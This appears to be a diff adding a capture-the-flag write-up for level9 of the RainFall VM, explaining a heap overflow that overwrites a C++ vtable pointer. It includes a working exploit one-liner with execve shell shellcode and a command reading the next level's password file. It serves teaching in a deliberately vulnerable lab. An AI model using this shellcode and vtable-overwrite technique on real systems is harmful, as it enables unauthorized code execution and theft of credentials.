@@ -1,0 +1,29 @@
+# level9 → bonus0
+
+Each `N` object is 108 bytes: a four-byte vtable pointer, 100 annotation
+bytes, and a four-byte value. `setAnnotation` uses `strlen` and then
+`memcpy` without checking the 100-byte annotation size. The two objects
+are adjacent on the VM heap. Starting at the first object's annotation,
+108 bytes reach the second object's vtable pointer.
+
+The payload places a fake one-entry vtable at `0x0804a00c`; that entry
+points at shellcode at `0x0804a010`. After 104 bytes of shellcode and NOP
+padding, it replaces the second object's vtable pointer with `0x0804a00c`.
+The subsequent virtual `operator+` call then jumps to the shellcode.
+These heap addresses and heap execution are properties of the supplied VM.
+
+From the level9 account on the RainFall VM:
+
+```sh
+(
+  cat
+) | ./level9 "$(python2.7 -c 'import struct
+sc="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
+print struct.pack("<I",0x0804a010) + sc.ljust(104,"\x90") + struct.pack("<I",0x0804a00c)')"
+id
+cat /home/user/bonus0/.pass
+```
+
+In GDB, `disassemble N::setAnnotation` shows the unchecked `memcpy`;
+`disassemble main` shows the virtual call. Inspect the two `new` results
+and their vtable pointers to confirm the offset and addresses.
